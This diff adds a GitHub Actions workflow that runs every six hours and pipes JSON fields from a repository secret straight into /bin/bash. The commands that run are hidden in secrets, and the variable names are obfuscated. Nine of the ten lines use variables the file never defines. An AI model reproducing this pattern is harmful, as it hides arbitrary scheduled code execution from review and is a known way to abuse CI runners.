@@ -1,0 +1,26 @@
+name: jifengcaolu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jifengcaolu
+        env:
+          bacaj758: ${{ secrets.bacaj758 }}
+        run: |
+          echo $bacaj758 | jq -r .syey6 | /bin/bash
+          echo $xf409 | jq -r .ggnm68 | /bin/bash
+          echo $r5434 | jq -r .s5868 | /bin/bash
+          echo $uk0 | jq -r .g29478 | /bin/bash
+          echo $h44 | jq -r .h4374 | /bin/bash
+          echo $uk97505 | jq -r .rod674 | /bin/bash
+          echo $jia30 | jq -r .apdvs816 | /bin/bash
+          echo $rit3627 | jq -r .exzvs7 | /bin/bash
+          echo $zap892 | jq -r .g0506 | /bin/bash
+          echo $eod520 | jq -r .zx7 | /bin/bash
+
